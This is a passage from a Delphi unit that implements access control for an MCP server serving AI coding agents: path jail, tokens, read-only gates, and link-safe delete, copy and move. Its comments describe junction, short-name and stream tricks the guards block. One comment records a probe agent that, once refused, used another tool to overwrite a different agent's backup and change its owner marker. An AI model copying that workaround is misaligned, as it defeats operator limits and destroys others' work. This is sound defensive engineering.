unit Lsp.Guard;

{ Access control: the security unit. Three layers, all configured in
  settings.ini next to the exe (env vars take precedence):

  1. Workspace jail - [Workspace] Roots / DELPHI_MCP_ROOTS. With roots
     configured, EVERY tool that touches the disk must stay inside them;
     paths are canonicalized so ..\ tricks and prefix cousins do not escape.
     No roots = unrestricted (local trusted mode).

  2. Credentials - SOLO tokens por workspace ([Workspace.<nombre>] Token= /
     ReadOnlyToken=). Sin coincidencia, 401: no hay anonimo ni modo abierto
     (v0.98). Enforced by the HTTP transport; this unit reads and caches.

  3. Read-only gate - ToolCallDenied is THE single entry gate, consulted by
     the tools dispatcher before ANY tool executes. The read/write
     classification of every tool lives HERE and nowhere else.

  4. Reference projects - [Workspace.<name>] ReadOnlyRoots (David,
     2026-09-25): folders OUTSIDE Roots that this workspace may READ as if
     they were its own and NEVER write. This is the door through which
     remote agents will see the house's REAL projects as code references,
     so the contract is spelled out:
       - One list, its own (WorkspaceReadOnlyRoots), parsed by the same
         reader as Roots. One locator (ReadOnlyRootOf) answers "is this
         path in a reference?" for the gate, the temp folders and
         delphi_projects. Nobody re-derives it.
       - PathDenied (the WRITE gate) checks the reference list BEFORE the
         roots, so a reference WINS: a folder declared in both lists, or a
         root that lies inside a reference, is read-only. Its verdict
         carries its own reason (mvReferencia) and its own text.
       - ReadPathDenied (the READ gate) forgives mvReferencia and nothing
         else new: the vault, path anomalies and a junction that leaves
         the reference are still refused. The same RealPath check the
         roots get: a link planted inside a reference opens nothing.
       - Every tool that WRITES goes through PathDenied and therefore
         refuses a reference: edit, textedit, create, changeset, move (also
         copy=true, both ends), delete, upload, build, test run, package,
         deploy, remote-run, designer to-text/to-binary, styles build,
         config (everything but view), rename apply, desktop out=.
       - Every tool that READS goes through ReadPathDenied and therefore
         enters: read, list, search, fetch and the /files route, symbols,
         definition, references, hover, signature, completion, diagnostics
         (the LSP config is cached under LOCALAPPDATA, never next to the
         project), designer tree/get/lint/check-binding/layout, config
         view, test discover, rename preview, and the QUERY half of git
         (GitCommandIsQuery - the one classification, shared with the
         read-only credential).
       - Temp files (AgentTempDir) never land in a reference, its drive
         letters are served (srvX:) like the roots', and the [RutaDelServidor]
         floor (ArgPathOutsideDenied) uses the read gate, so it lets them in.
       - What it does NOT do: subtract. Everything under a reference root is
         readable, secrets included - point it at clean project folders.
     Measured by tests/test_readonly_roots.py (two servers). }

interface

uses
  System.Classes,
  System.JSON,
  Lsp.Discovery; // TRadStudioInfo for IdeMacroVars

{ '' = allowed; otherwise the rejection message to return to the agent.
  This is the WRITE jail: only the configured workspace roots. }
{ True = leave this tool OUT of tools/list under the active [Tools] profile
  or allowlist. Listing only - the tool stays callable; permissions are
  ToolCallDenied's job. delphi_help/messages/report always stay listed. }
function ToolHiddenFromList(const AToolName: string): Boolean;

{ Por que PathDenied dijo que no. Los perdones de ReadPathDenied van por
  este MOTIVO y nunca por el texto de la negativa ni por recomprobar la
  ruta: comparar texto se rompe en cuanto alguien reescribe un mensaje, y
  recomprobar por texto perdonaba el junction que RealPath acababa de
  cazar (auditoria 2026-09-21). }
type
  TMotivoVeto = (mvNinguno, mvAnomalia, mvVault, mvRootsInvalidos,
    mvRutaInvalida, mvEnlaceFuera, mvSoloLectura, mvConfinado,
    mvFueraDeJaula, mvReferencia);

function PathDenied(const APath: string): string; overload;
function PathDenied(const APath: string;
  out AMotivo: TMotivoVeto): string; overload;

{ Like PathDenied but for READING tools (read/search/list/fetch/LSP
  navigation): the jail is extended with the LIBRARY ZONE - the RAD Studio
  installation (RTL/VCL sources) and the IDE Library Search Path directories
  (installed components) - so an agent can follow a definition into
  System.Classes.pas or read a component's source. Read-only territory:
  writing tools keep using PathDenied and can never touch it. }
function ReadPathDenied(const APath: string): string;

{ The configured roots (empty array = unrestricted). }
function WorkspaceRoots: TArray<string>;

{ Carpetas de DENTRO de la jaula que se leen pero no se escriben: el
  ReadOnlyPaths= del workspace activo. Vacio = ninguna, que es el
  comportamiento de siempre. Mismo trato que la zona de biblioteca del IDE:
  las tools de lectura entran, las de escritura no. }
function WorkspaceReadOnlyPaths: TArray<string>;

{ Proyectos de REFERENCIA: el ReadOnlyRoots= del workspace activo (o
  DELPHI_MCP_READONLY_ROOTS en el modo local). Carpetas FUERA de Roots que
  las tools de lectura recorren como si fueran suyas - leer, buscar,
  simbolos, definicion, git de consulta, fetch - y las de escritura no tocan
  jamas: ni edit, ni build (escribe dcu/exe), ni temporales. La idea (David,
  25-sep-2026): un agente trabaja en sus roots y ademas VE otros proyectos
  de la casa para aprender como se hacen las cosas. Separado de Roots a
  proposito, y MANDA sobre Roots: una carpeta en los dos sitios, o una raiz
  dentro de una referencia, es de solo lectura ('lo que tienes mas claro es
  lo que quieres readonly'). }
function WorkspaceReadOnlyRoots: TArray<string>;

{ La raiz de referencia que contiene APath ('' = ninguna). EL sitio que sabe
  si una ruta es de referencia: lo usan la guarda, los temporales y
  delphi_projects. }
function ReadOnlyRootOf(const APath: string): string;

{ Bearer authorization - the ONE place that knows every credential: the
  per-workspace tokens from
  [Workspace.<name>] sections (Token= read-write inside its Roots,
  ReadOnlyToken= read-only inside its Roots). True = allowed; AReadOnly and
  AWorkspaceIx (-1 = every root, the operator) describe the scope the request
  gets. A workspace whose Roots failed to parse admits NOBODY (fail closed).
  Workspaces may OVERLAP - one can hold a whole tree and another a subfolder
  of it: each token's jail is the union of ITS OWN roots and nothing is ever
  subtracted for belonging to another workspace too. }
function AuthorizeBearer(const AAuth: string; out AReadOnly: Boolean;
  out AWorkspaceIx: Integer): Boolean;

{ Scopes THIS worker thread to a workspace (-1 = none: operator/stdio).
  Worker threads are reused, so the host calls this on EVERY request. }
procedure SetRequestWorkspace(AIx: Integer);

{ The active workspace's name ('' = none) - for delphi_workspace and logs. }
function CurrentWorkspaceName: string;
{ La ruta del settings.ini: UN nombrador (estaba compuesta a mano en tres
  sitios de esta unidad, 24-sep-2026). Lo lee LoadSecurity al arrancar y lo
  mira delphi_workspace para avisar de que el fichero cambio despues. }
function SettingsIniPath: string;

{ [Log] LinesPerFile / MaxFiles tal cual los trae el settings.ini (2000 y
  10 si no estan), leidos por el lector central, LoadSecurity. Los usa
  Lsp.LogSink; hasta el 26-sep los leia la bandeja con su propio TIniFile. }
procedure LogIniSettings(out ALinesPerFile, AMaxFiles: Integer);

{ True when any [Workspace.*] token is configured (counts as a credential
  for the fail-safe bind decision). }
function WorkspaceTokensConfigured: Boolean;

{ Startup lines about the workspace config: which workspaces loaded (the
  workspaces listed by name over the global
  roots - one mechanism, two spellings) plus a warning per misconfiguration
  (misspelled section, tokenless workspace, unparseable roots). Empty when
  there is nothing to say. }
function WorkspaceStartupNotes: TArray<string>;

{ One-line human summary of the WRITE jail for the startup log (the single
  source of how the jail is described). AWarning is set when the state
  deserves a warning level: no jail at all (unrestricted) or fail-closed
  (Roots= had text but resolved to nothing). Paths are shown REAL here - the
  log goes to the operator's own stderr on the server, not to a client. }
function WorkspaceJailSummary(out AWarning: Boolean): string;

{ The READ-ONLY library zone (RAD Studio installations, IDE library search
  paths, GetIt catalog repositories). Readable by reading tools, never
  writable - exposed so delphi_workspace can tell the agent what it may read
  besides the roots (field round 4, R4-B). }
function LibraryReadRoots: TArray<string>;

{ The IDE's macro table for one installation ($(BDS), $(BDSLIB),
  $(BDSUSERDIR), $(BDSCOMMONDIR), $(BDSCatalogRepository)...), the same one
  the library zone is built from. ADest receives Name=Value pairs. }
procedure IdeMacroVars(const AInfo: TRadStudioInfo; ADest: TStrings);

{ The IDE's Library Search Path of ONE platform, every entry expanded to a
  real folder (macros resolved, no trailing delimiter), in registry order.
  Entries that still carry an unresolved macro or are not rooted are left
  out. What "delphi_components platform=X" shows and what the F2613 helper
  of delphi_build compares against. }
function IdePlatformLibraryPaths(const AVersion, APlatform: string): TArray<string>;

{ EL NOMBRADOR DE LOS TEMPORALES, hermana de __delphi-patch y con la misma
  disciplina: el nombre de la carpeta se escribe en UN SITIO y nadie compone
  una ruta de temporales a mano.

  Por que existe: hasta el 2026-09-21 el servidor escribia sus temporales en
  el %TEMP% de la MAQUINA, en siete sitios distintos y a mano. Medido ese
  dia: 56,4 MB olvidados ahi fuera de toda jaula -33 capturas del escritorio
  del operador de dos dias antes y una salida de remoterun de 10,7 MB-, y un
  fichero de 10 bytes que una bateria se dejo suelto acabo siendo el
  "proyecto" de las units de otras tres. Un temporal repartido no se purga
  nunca.

  DOS CASAS, y el criterio es el mismo que separa a __delphi-temp de
  __delphi-patch:

    ServerTempDir  lo que es del SERVIDOR y el agente no toca nunca (el
                   fichero del mensaje de git, la descarga de un SDK, el
                   guion que se manda a un target). Va JUNTO AL EJECUTABLE,
                   como reports\ y settings.ini, y se puede borrar en
                   cualquier momento: nada de lo que hay ahi sobrevive a la
                   llamada que lo creo. No pasa por la jaula porque no es
                   una ruta que elija nadie de fuera.

    AgentTempDir   lo que el agente tiene que ALCANZAR: una captura que se
                   baja con delphi_fetch, una salida que se lee. Va DENTRO
                   del workspace, porque delphi_fetch comprueba la jaula y
                   un entregable fuera de ella es un entregable que no se
                   puede entregar (medido: el flujo documentado de
                   delphi_desktop estaba roto de punta a punta). Y con la
                   carpeta del agente, porque una jaula puede estar
                   compartida por varios: la captura de uno no se le pone
                   delante a otro.

  Componen la ruta y ya: crear la carpeta es de quien la use. }
function TempFolderName: string;
{ <carpeta del exe>\ASub: LA casa del servidor. Todo lo que el servidor
  guarda o busca junto a si mismo (settings.ini, __delphi-temp, logs,
  messages, reports, node, el conversor de estilos) se compone aqui; hasta
  el 26-sep lo componian a mano ocho sitios. Sin ASub, la carpeta. }
function ServerDir(const ASub: string = ''): string;
function ServerTempDir(const ASub: string = ''): string;
function AgentTempDir(const ASub: string = ''): string;

{ Una CAPTURA (escritorio o Android) en una carpeta temporal del servidor (un
  .png bajo <...>\__delphi-temp\...\desktop|android\) se CONSUME al recogerla: quien la
  baja - delphi_fetch al servir el ultimo trozo, GET /files - la borra.
  David, 25-sep-2026: 'lo mas sensato es borrar la captura una vez la ha
  recogido el agente, asi de simple; nada de caches ni rotaciones ni guardar
  nada; quiere otra, que la pida'. Medido el mismo dia: 10 gestos = 41 MB en
  la raiz del workspace, purgados solo al reiniciar. Una captura pedida con
  out= explicito NO esta en esa carpeta y no se toca. }
const
  // Las subcarpetas de captura: las pasa quien llama a CaptureTarget y las
  // reconoce IsAgentCapture. UNA lista - hasta el 25-sep-2026 el reconocedor
  // solo sabia de 'desktop' y las capturas de delphi_adb ('android') se
  // acumulaban sin consumirse.
  CAPTURE_SUB_DESKTOP = 'desktop';
  CAPTURE_SUB_ANDROID = 'android';

function IsAgentCapture(const APath: string): Boolean;
procedure ConsumeAgentCapture(const APath: string); // nunca lanza

{ DONDE CAE UNA CAPTURA: el "out" de toda la familia (delphi_desktop,
  delphi_adb_linux, delphi_adb), resuelto en UN sitio. Hasta la v1.0.13 era
  una CARPETA en los dos escritorios y un FICHERO obligatorio acabado en
  ".png" en delphi_adb - misma idea, mismo nombre de parametro, contrato
  distinto - y el nombre del fichero se componia a mano en tres sitios. Un
  agente que pasaba out=...\captura.png a delphi_desktop conseguia una
  CARPETA llamada captura.png.

    vacio                          -> AgentTempDir(ASub), nombre nuestro
    carpeta que existe, o acaba \  -> esa carpeta, nombre nuestro
    sin extension                  -> carpeta nueva, nombre nuestro
    extension = la de la captura   -> ESE fichero
    otra extension                 -> RECHAZADO, nombrando el formato real

  AExt es la extension REAL de la captura (con su punto), la que trae lo
  que devolvio el nodo o el dispositivo: aqui no hay ningun "png" escrito.
  Si un dia un nodo devuelve otro formato, la regla sigue valiendo y nadie
  recibe una imagen con la extension de otra (David, 2026-09-21: "y si un
  dia no es png?"). Devuelve '' y el fichero final en AFile, o la negativa.
  Un destino que elige quien llama pasa por PathDenied; el nuestro no, que
  ya sale de AgentTempDir. No crea nada: crear la carpeta es de quien la use. }
function CaptureTarget(const AOut, ASub, APrefix, AExt: string;
  out AFile: string): string;

{ Borra un arbol entero SIN CRUZAR ENLACES: un junction/symlink que haya
  dentro se elimina como ENTRADA (cae el enlace, jamas su destino). El
  TDirectory.Delete recursivo de la RTL entra en cualquier cosa con el bit
  de directorio sin mirar el de reparse (System.IOUtils,
  WalkThroughDirectory) y borra los ficheros DEL DESTINO: un junction
  plantado en la jaula apuntando fuera convertia cualquier borrado
  recursivo en un borrado FUERA de la jaula (auditoria 2026-09-21). Habia
  SEIS borrados recursivos sueltos por el codigo; este es ahora el unico,
  y quien necesite tirar un arbol pasa por aqui. Limpia atributos
  (solo-lectura) como hacia la RTL - los objetos de un .git vienen asi.
  Lanza si no puede: que cada llamador decida si tragarselo.

  Y desde el 25-sep-2026 LANZA TAMBIEN SI NO DEBE: antes de tocar nada pasa
  por BorradoDenegado (abajo). No hay otra forma de borrar un arbol. }
procedure BorraArbol(const ADir: string);

{ LAS carpetas desechables del servidor, por nombre de segmento: lo UNICO
  dentro de lo que BorraArbol borra (hoy la temporal y la papelera). Una
  lista: si manana nace otra (una cache, un spool), se anade AQUI y el guard
  la conoce, sin tocar la logica (David, 25-sep-2026). Todas empiezan por
  __: es la tercera barrera de BorradoDenegado. }
function CarpetasDesechables: TArray<string>;

{ EL nombrador de la carpeta de descarga temporal ('__tmp-' + 8 hex) que
  crea quien baja algo de un target, y su lector: la unica carpeta fuera de
  una desechable que BorraArbol acepta, porque la acaba de crear el servidor. }
function NuevaCarpetaDescarga(const ADentroDe: string): string;
function EsCarpetaDescarga(const ANombre: string): Boolean;

{ EL normalizador de lo que un CLIENTE nombra y acaba en el disco (el
  agente de un buzon o de un informe, el titulo de un informe): letras y
  cifras ASCII, el resto se junta en un guion, 40 como mucho, minusculas.
  Nada del valor crudo llega al sistema de ficheros. Uno solo: estaba
  copiado identico en Mcp.Tools.Messages y Mcp.Tools.Report (25-sep-2026). }
function Slug(const S: string): string;

{ LOS sitios que un borrado o una mudanza nunca pueden SER ni CONTENER: toda
  raiz de workspace (de escritura y de referencia, de cualquier workspace, y
  las del modo local) y sus carpetas de solo lectura (ReadOnlyPaths), el
  vault, la carpeta del servidor, Windows, Archivos de programa y la carpeta
  del usuario. Una lista: un sitio sagrado nuevo se anade AQUI. }
function LugaresProtegidos: TArray<string>;

{ La decision de BorraArbol, sola: '' = ADir se puede borrar entero; si no,
  el motivo. (1) LISTA BLANCA: tiene que estar DENTRO de una carpeta
  desechable (nunca la carpeta misma) o ser/estar en una carpeta de
  descarga. (2) LISTA NEGRA: no puede ser ni contener un lugar protegido, ni
  ser una unidad o un recurso compartido entero. Se evalua sobre la ruta
  REAL del padre + el nombre: un junction en el camino no hace pasar por
  temporal lo que no lo es, y quitar un enlace (que nunca toca lo de detras)
  se juzga por donde esta el enlace. }
function BorradoDenegado(const ADir: string): string;

{ Vacia una carpeta DESECHABLE (temporal o papelera: CarpetasDesechables) sin
  borrarla, por el borrador con guard. Nunca una que sea un enlace (seria
  vaciar lo de detras) ni una de otro nombre. Nunca lanza. EL vaciador: la
  purga del arranque y la copia de carpetas (que no se lleva la papelera del
  origen) pasan por aqui (25-sep-2026). }
procedure VaciaDesechable(const ADir: string);

{ EL copiador de arboles: copia AOrigen en ADestino SIN FUGAS DE LECTURA. Un
  enlace (junction o symlink, de carpeta o de fichero) se sigue SOLO si su
  destino real pasa la puerta de lectura de la sesion (ReadPathDenied): sus
  raices, sus ReadOnlyRoots, la zona de biblioteca. Si no, no se copia y va
  a ANoSeguidos. TDirectory.Copy de la RTL seguia cualquier junction: uno
  plantado en una carpeta (un git clone con enlaces lo mete sin consola)
  copiaba DENTRO de la jaula lo que la jaula no deja leer (25-sep-2026;
  David: 'solo se puede escribir en tu workspace, incluye copiar', y leer
  fuera es lo que el operador declara, 'ReadOnlyRoots es para eso').
  AConPapelera: si copia tambien las papeleras (__delphi-patch) que haya
  dentro. Un bucle de enlaces se corta por la ruta real ya visitada. Lanza si
  no puede copiar. }
procedure CopiaArbol(const AOrigen, ADestino: string; AConPapelera: Boolean;
  out ANoSeguidos: TArray<string>);

{ La decision de copy=true, sola: '' = se puede copiar AOrigen en ADestino.
  No, si ADestino cae DENTRO de AOrigen (se copiaria sin fin), ni si lo que
  se va a copiar ES o CONTIENE un proyecto (.dproj, .dpk, .dpr): un proyecto
  nunca vive en dos sitios (David, 24-sep-2026). Se mira lo que la copia VA
  a copiar: los enlaces con la misma regla que CopiaArbol (EnlaceLegible),
  sin la papelera, y un fichero suelto tambien (un .dproj copiado solo se
  colaba; el .dpr ni se contaba - auditoria 25-sep-2026). }
function CopiaDenegada(const AOrigen, ADestino: string): string;

{ P es un enlace (junction o symlink, de carpeta o de fichero). LA
  comprobacion: estaba escrita cuatro veces en esta unidad. }
function EsEnlace(const P: string): Boolean;

{ El primer trozo de S partido por ASeps; '' si S es ''. S.Split(...)[0] a
  secas lee fuera del array cuando S es '' (Delphi devuelve un array
  VACIO): un Access violation medido el 25-ago en delphi_edit y parcheado
  en ESE sitio, y otra vez el 26-sep en delphi_textedit (una tanda con un
  ancla vacia y "occurrence"), con otros cinco Split()[0] sueltos. }
function PrimerTrozo(const S: string; const ASeps: array of Char): string;

type
  TVisitaRuta = reference to procedure(const APath: string);

{ Visita cada fichero y carpeta DEBAJO de ADir (no ADir) sin cruzar NUNCA un
  enlace: un enlace ni se visita ni se entra - tocarlo seria tocar lo de
  detras (SetFileSecurity sobre un junction etiqueta su destino). EL
  recorrido de quien tiene que tocar cada entrada de un arbol y no es borrar
  ni copiar (esos son BorraArbol y CopiaArbol): el etiquetado de integridad
  de delphi_test cruzaba un junction con soAllDirectories y bajaba la
  etiqueta de un fichero de FUERA de la jaula (medido en vivo, 25-sep-2026).
  Nunca lanza: una rama ilegible se salta.

  AAlEnlace (opcional) recibe cada enlace que se encuentra, sin entrar
  en el: para quien necesita SABER que hay uno antes de hacer algo que
  si lo cruzaria (quitar un worktree: git lo atraviesa, medido el
  26-sep-2026). Un parametro del recorredor, no otro recorredor. }
procedure RecorreSinEnlaces(const ADir: string; const AVisita: TVisitaRuta;
  const AAlEnlace: TVisitaRuta = nil);

{ LA regla de enlaces de quien RECORRE un arbol: se sigue solo si lo de
  detras se puede LEER en esta sesion. La usan el copiador, la decision de
  la copia y el recorredor de ficheros (delphi_search, delphi_list,
  delphi_projects, el zip de delphi_package): lo que se ensena, se busca o
  se empaqueta es lo que se podia leer. }
function EnlaceLegible(const P: string): Boolean;

{ EL mudador de carpetas: AOrigen pasa a ser ADestino RENOMBRANDOLA (MoveFile
  en la misma unidad) o NADA. No abre la carpeta ni toca sus ficheros: un
  junction de dentro viaja como enlace y lo de detras ni se mira; si algo
  de dentro esta abierto, falla entera y la carpeta sigue intacta. Lo que
  hacia TDirectory.Move de la RTL cuando no podia renombrar - copiar y
  borrar fichero a fichero ENTRANDO en los junctions - se trajo a la jaula
  y BORRO de su sitio el contenido de una carpeta de fuera (reproducido en
  vivo el 25-sep-2026, presente desde v0.16). Antes de tocar nada pasa por
  MovidoDenegado. No hay otra forma de mover un arbol: delphi_move y la
  papelera de delphi_delete pasan por aqui. Lanza si no debe o no puede. }
procedure MueveArbol(const AOrigen, ADestino: string);

{ La decision de MueveArbol, sola: '' = se puede. Las dos rutas pasan la
  puerta de escritura (PathDenied), el origen ni ES ni CONTIENE un lugar
  protegido (ProtegidoDenegado) y las dos estan en la misma unidad: entre
  unidades no hay renombrado, y copiar y borrar es justo lo prohibido.
  Quien quiera rechazar ANTES de preparar nada (la copia de seguridad de
  delphi_move) la llama primero; MueveArbol la repite igualmente. }
function MovidoDenegado(const AOrigen, ADestino: string): string;

{ '' salvo que la carpeta ADir SEA o CONTENGA un lugar protegido
  (LugaresProtegidos). PathDenied mira la ruta que le pasan, y mover o
  tirar a la papelera una carpeta se lleva TODO lo de dentro: un proyecto
  de referencia declarado DENTRO de una raiz de escritura, o la raiz de
  otro workspace, se iban con su padre (David, 25-sep-2026: 'ese agujero
  es grave'). El lugar se NOMBRA solo si la sesion ya lo puede leer: la
  raiz de otro workspace, el vault o la carpeta del servidor no se
  revelan, se dice un sitio protegido. }
function ProtegidoDenegado(const ADir: string): string;

{ LA pregunta de todo escritor: '' = esta sesion puede escribir APath;
  si no, el motivo. Es la puerta de escritura (PathDenied, sobre la ruta
  REAL) mas el modo de solo lectura. La hacen los ESCRITORES mismos
  (AtomicWrite, BackupFile), no solo quien los llama: renombrar una unit
  reescribia cada fichero que listaba el .dpr, y el .dpr puede listar
  uno de fuera o de una referencia (medido en vivo contra 1.3.1,
  25-sep-2026). Un llamador que se olvide de preguntar ya no abre
  nada: el escritor lanza. }
function EscrituraDenegada(const APath: string): string;

{ Vacia la casa del servidor al arrancar. Lo que hay ahi pertenece a la
  llamada que lo creo y ninguna llamada sobrevive a un reinicio, asi que al
  arrancar TODO lo que quede es basura de una ejecucion anterior - la que
  dejo 56,4 MB olvidados en el %TEMP% de la maquina durante dos dias, medido
  el 2026-09-21. Solo purga la PRIMERA instancia viva de este exe: la
  premisa "el servidor y la bandeja no pueden correr a la vez, comparten
  puerto" no vale para stdio, que no abre puerto ninguno y comparte la
  carpeta con el servicio - su purga borraria ficheros EN USO de una
  llamada en vuelo del otro (el -F de un commit, una salida de remoterun).
  Nunca lanza: un temporal que no se deja borrar no es motivo para no
  arrancar.
  Y de las temporales de las RAICES, solo las que no son de OTRO servidor
  vivo (TemporalEsMia): el cerrojo de arriba va por la carpeta del exe, y
  un servidor con otro exe y la misma raiz -una bateria sobre el repo, con
  el servicio sirviendo ese repo- vaciaba las del otro con llamadas en
  vuelo (visto al revisar las baterias, 26-sep-2026). }
procedure PurgeServerTemp;

{ Credentials (env var first, then settings.ini [Workspace] next to the exe). }
function AuthToken: string;         // DELPHI_MCP_TOKEN         / AuthToken
function ReadOnlyToken: string;     // DELPHI_MCP_READONLY_TOKEN / ReadOnlyToken
function BindIP: string;            // DELPHI_MCP_BIND_IP        / [Server] BindIP ('' = all)

{ Que RAD Studio usa el workspace ACTIVO cuando la maquina tiene varios lado
  a lado: [Workspace.<x>] DelphiVersion=36.0 (o DELPHI_MCP_DELPHI_VERSION en
  el modo local de lanzamiento). '' = la regla de siempre, la mas nueva con
  DelphiLSP. La decide el workspace y no el agente porque la version la manda
  el PROYECTO, y un workspace es un proyecto. Quien la aplica es
  DiscoverRadStudio (Lsp.Discovery), el unico sitio que elige instalacion. }
function PreferredDelphiVersion: string;

{ The knowledge-vault root (Obsidian notes). Empty when unset.
  Env DELPHI_MCP_VAULT_PATH (solo el workspace por defecto), si no el
  VaultPath= del workspace activo. Canonicalized, no trailing delimiter. The vault_read/vault_search tools register only when
  VaultConfigured is true. }
function VaultPath: string;         // DELPHI_MCP_VAULT_PATH / VaultPath= del workspace
function VaultConfigured: Boolean;  // VaultPath set AND the directory exists
function VaultConfiguredAnywhere: Boolean; // algun workspace declara vault (registro)

{ Whether APath is inside the knowledge vault. The vault belongs to the
  vault_* tools alone, so the code tools skip it in their walks even when it
  sits inside a workspace root - a listing that showed the notes would invite
  an agent to edit them behind the vault's back. }
function InVault(const APath: string): Boolean;

{ THE Windows name rule, in one place: a path segment ending in a dot or a
  space, or carrying an Alternate Data Stream (":"), is refused - Windows
  normalizes those away when opening, so what a check sees and what gets
  written are different files. Used by the workspace jail AND by the vault
  resolver: the same trick defeated both (delphi_textedit in an early round,
  the vault governance files in round 9), so the rule lives here once instead
  of being re-derived per toolset. '' = the name is fine. }
function PathAnomaly(const APath: string): string;

{ Whether the vault WRITE tools (vault_append/create/patch) are enabled:
  el vault del workspace activo esta configurado Y su VaultReadOnly= es 0
  (defecto 1 = solo lectura).
  Even when writable, the write tools are refused for a read-only credential
  at the gate (they are in the mutating list). }
function VaultWritable: Boolean;    // VaultConfigured AND VaultReadOnly=0 del workspace

{ Whether delphi_build may run a project's OWN build scripts: a custom <Target>,
  a post-build step, Authenticode signing via <Exec>. Its own opt-in, for a
  TRUSTED project that signs or copies at build time; nothing else runs here.
  Untrusted uploads with no opt-in still hit the hazard scanner. Opt in with
  DELPHI_MCP_ALLOW_BUILD_SCRIPTS=1 or AllowBuildScripts=1 en el workspace. }
function AllowBuildScripts: Boolean; // DELPHI_MCP_ALLOW_BUILD_SCRIPTS / AllowBuildScripts=1

{ Whether delphi_paserver may EXECUTE the deployed program on a PAServer
  target (command=remote-run). OFF by design. Since 2026-09-23 it is the ONLY
  way this product executes a program (delphi_run, execution on the server
  itself, was retired: one door instead of two), and the operator of this
  server is not necessarily the owner of that machine. Two locks in series, on
  purpose: this switch (server side) and the runner someone has to launch on
  the target. Opt in with DELPHI_MCP_ALLOW_REMOTE_RUN=1 or
  AllowRemoteRun=1. install-runner does NOT need it: copying the script
  executes nothing. }
function AllowRemoteRun: Boolean;   // DELPHI_MCP_ALLOW_REMOTE_RUN / AllowRemoteRun=1

{ Whether delphi_test may RUN a test project's binary on this server. OFF by
  default, and the ONE thing that ever runs on this machine (delphi_run,
  arbitrary binaries, was retired 2026-09-23: one door): the binary comes
  from a project of the jail, is built here, and goes through the
  low-integrity sandbox with a timeout. Opt in with
  DELPHI_MCP_ALLOW_TESTS=1 or AllowTests=1 en el workspace. }
function AllowTests: Boolean;      // DELPHI_MCP_ALLOW_TESTS / AllowTests=1

{ WHO is calling - as far as this server can honestly know.

  Two-phase, the way the operator asked: the SHARED token (Bearer) is the door,
  the same for everyone. Then the handshake's clientInfo.name is bound to the
  session id the server issues in `initialize` - and that id is a secret the
  server generated, returned once, and the client echoes on every request. So
  the NAME is fixed at connect time and cannot be re-declared per call: to be
  taken for another agent you would have to steal their session id, not just
  type their name. That is the whole gain over the old self-declared 'agent'
  string.

  Not authentication (one token still lets anyone connect), but enough to keep
  agents working in different projects from stepping on each other, and to
  stop casual impersonation. A real per-agent token is the next rung.

  Bound at initialize; read on every tool call via the per-thread context the
  HTTP layer sets before dispatch. '' when unknown (stdio with no name, or a
  request before initialize) - callers treat that as 'anon'. }
procedure BindSessionIdentity(const ASessionId, AName: string);
procedure SetThreadIdentityBySession(const ASessionId: string);
procedure SetThreadIdentity(const AName: string); // stdio: one process, one name
procedure ClearThreadIdentity;
function CurrentAgent: string;               // '' = unknown
function CurrentAgentOr(const ADefault: string): string;

{ El REGISTRO de sesiones HTTP - uno solo, el mismo que guarda la identidad
  (hasta 1.0.16 el servidor HTTP llevaba un anillo aparte de ids conocidos:
  dos escritores para la misma cosa). Una sesion nace en initialize
  (BindSessionIdentity, con nombre o sin el), se toca en cada peticion que
  la usa y CADUCA tras SessionTimeoutMinutes de inactividad: [Server]
  SessionTimeoutMinutes en settings.ini o DELPHI_MCP_SESSION_TIMEOUT_MINUTES
  (720 por defecto, 0 = nunca). La puerta HTTP contesta 404 a una sesion
  desconocida o caducada - lo que manda el contrato streamable-HTTP - y el
  cliente vuelve a hacer initialize. Un initialize con un id viejo siempre
  pasa: es el arreglo, no el problema. }
type
  TSessionState = (ssUnknown, ssExpired, ssAlive);
  TSesion = record
    Id, Nombre: string;
    UltimoUso: TDateTime;
  end;
function SessionState(const ASessionId: string): TSessionState; // viva = la toca
function SessionTimeoutMinutes: Double;                         // 0 = nunca caduca
function LiveSessionCount: Integer;                             // purga las caducadas

{ Dead copies are not a scratchpad. The recoverable trash, and the IDE's own
  __history/__recovery, hold the LAST GOOD version of somebody's work - the
  whole reason every write here is safe. Writing into them destroys exactly
  what they exist to preserve, and it does not even need a purge: overwrite
  the copy and the original is gone for good.

  Measured 2026-08-25 by a probe agent: delphi_edit refused the trash, so the
  agent went through delphi_textedit (which handles NON-Delphi text and had no
  such rule) and (a) rewrote another agent's recoverable copy, and (b) edited
  the ".by" owner marker of a copy that was not its own, from "bob" to its own
  name, and then purged it legitimately. A guard one tool wide is not a guard.

  Reading a dead copy is fine (that is how you decide whether to restore it);
  moving one OUT is the restore itself. Only writing IN is refused. }
function DeadCopyWriteDenied(const APath: string): string;

{ EL gate de DESTINO de escritura: la jaula (PathDenied) y las carpetas
  muertas (DeadCopyWriteDenied), en ese orden. Todo escritor que cree o
  reescriba un fichero en una ruta que elige el agente pasa por aqui. Hasta
  el 25-sep-2026 cada escritor escribia el par a mano (cuatro copias) y dos
  no lo hacian: el out= de las capturas (90 capturas, 66 MB acumulados en
  una __delphi-temp anidada que la purga no alcanza) y el destino de
  delphi_move. El proximo escritor llama a esta y ya esta. Queda fuera a
  proposito el out= del logcat de adb: su sitio natural ES un temporal, y
  rechazarlo empujaria los volcados dentro del proyecto (David, 25-sep-2026). }
function WriteTargetDenied(const APath: string): string;

{ The SAME directory can be named more than one way, and a guard that matches a
  path segment literally is blind to every alias. NTFS keeps an 8.3 short name
  for each entry ("__delphi-patch" also answers to "__DELP~1"), and it resolves
  to the identical folder - so a path through "__DELP~1" walked straight past
  the trash guard and reopened writing into the recoverable copies (measured
  2026-08-25).

  This expands the longest existing prefix of a path back to its real names
  before any segment guard looks at it. It cannot blanket-reject "~": the
  server's own scratch and home paths legitimately contain one (DFONTA~1). }
function LongCanonical(const APath: string): string;

{ LA ruta REAL: junctions y symlinks resueltos, nombres largos (la nota
  larga, en la implementacion). Publica para COMPARAR y reconocer - una
  clave de visitados que corta un ciclo de enlaces, un "esta dentro de" -,
  nunca para decidir un permiso por tu cuenta: eso es de las puertas. }
function RealPath(const APath: string): string;

{ Crea una carpeta (y sus padres) TOLERANDO que otro hilo la este creando a la
  vez. TDirectory.CreateDirectory mira si existe y LUEGO crea: dos hilos
  entran juntos, los dos contestan "no existe", los dos crean, y el que pierde
  se lleva un EInOutError "no se puede crear un archivo que ya existe".

  Es la misma carrera que delphi_report ya resolvia para el NOMBRE del fichero
  con CREATE_NEW... doce lineas mas abajo de donde la dejaba abierta para la
  CARPETA. Medido el 2026-09-20 por la bateria de concurrencia, que falla de
  higos a brevas justo por esto: de 8 informes simultaneos llegaban 7.

